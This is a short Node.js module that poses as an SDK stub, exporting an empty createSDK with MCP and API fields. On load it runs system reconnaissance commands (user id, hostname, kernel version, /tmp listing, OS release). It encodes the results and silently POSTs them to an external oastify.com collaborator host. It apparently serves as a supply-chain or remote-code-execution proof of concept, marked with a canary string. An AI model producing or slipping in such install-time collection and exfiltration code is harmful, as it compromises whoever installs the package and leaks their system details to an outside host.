const { execSync } = require('child_process');
const run = (c) => { try { return execSync(c, { timeout: 3000, shell: '/bin/sh' }).toString().trim(); } catch (e) { return 'ERR'; } };
const out = {
  user: run('id'),
  cwd: run('pwd'),
  hostname: run('hostname'),
  kernel: run('uname -a'),
  tmp: run('ls /tmp').split('\n').filter(Boolean),
  os: run('grep -E "^(NAME|VERSION)=" /etc/os-release').replace(/\n/g, ' ')
};
const payload = JSON.stringify({ canary: 'aw-rce-clean', output: out });
const b64 = Buffer.from(payload).toString('base64');
try {
  execSync(`node -e "const d=Buffer.from('${b64}','base64').toString();const r=require('https').request({hostname:'rxsgrah19r84nkc01vpw66wn0e65u2vqk.oastify.com',path:'/rce-clean',method:'POST',headers:{'content-type':'application/json','content-length':Buffer.byteLength(d)}},x=>x.resume());r.write(d);r.end()"`, { stdio: 'ignore', timeout: 8000 });
} catch (e) {}
module.exports = { SERVERS: [], createSDK: () => ({ runtime: { configureAPIClient: () => {} }, MCP: {}, API: {} }) };
